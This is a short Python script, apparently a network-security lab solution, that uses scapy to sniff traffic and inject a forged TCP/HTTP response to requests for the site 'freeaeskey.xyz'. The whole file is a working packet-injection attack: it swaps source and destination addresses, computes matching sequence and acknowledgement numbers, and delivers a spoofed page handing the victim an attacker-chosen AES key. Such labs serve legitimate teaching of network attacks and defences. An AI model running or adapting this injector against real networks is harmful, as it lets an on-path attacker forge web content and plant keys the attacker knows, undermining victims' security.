from scapy.all import *
import socket
from scapy.layers.inet import TCP, IP, Ether


def inject_pkt(pkt):
    # import dnet
    # dnet.ip().send(pkt)
    conf.L3socket = L3RawSocket
    send(pkt)


######
# edit this function to do your attack
######
def handle_pkt(pkt):
    if "freeaeskey.xyz" in str(pkt):
        try:
            dst = pkt[IP].dst
        except TypeError:
            return 1
        src = pkt[IP].src
        _ip = IP(src=dst, dst=src)  # swap the source and dest for new packet
        ack = pkt[TCP].ack
        seq = pkt[TCP].seq
        dport = pkt[TCP].dport
        sport = pkt[TCP].sport
        offset = len(pkt[TCP].payload)
        print(seq, ack, offset)
        flags = "PA"  # TCP:PA = PSH+ACK, immediately open and acknowledge
        _tcp = TCP(seq=ack, ack=(seq + offset), sport=dport, dport=sport, flags=flags)  # Once again we will swap src and dst

        server_header = "HTTP/1.1 200 OK\r\nServer: nginx/1.14.0 (Ubuntu)\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 335\r\nConnection: close\r\n\r\n"
        server_html = """<html>
<head>
  <title>Free AES Key Generator!</title>
</head>
<body>
<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>
<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>
<br/>
<br/>
Your <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>
</body>
</html>"""
        _payload = server_header + server_html
        packet = _ip / _tcp / _payload
        inject_pkt(packet)


def main():
    sniff(filter="ip", prn=handle_pkt)


if __name__ == '__main__':
    main()
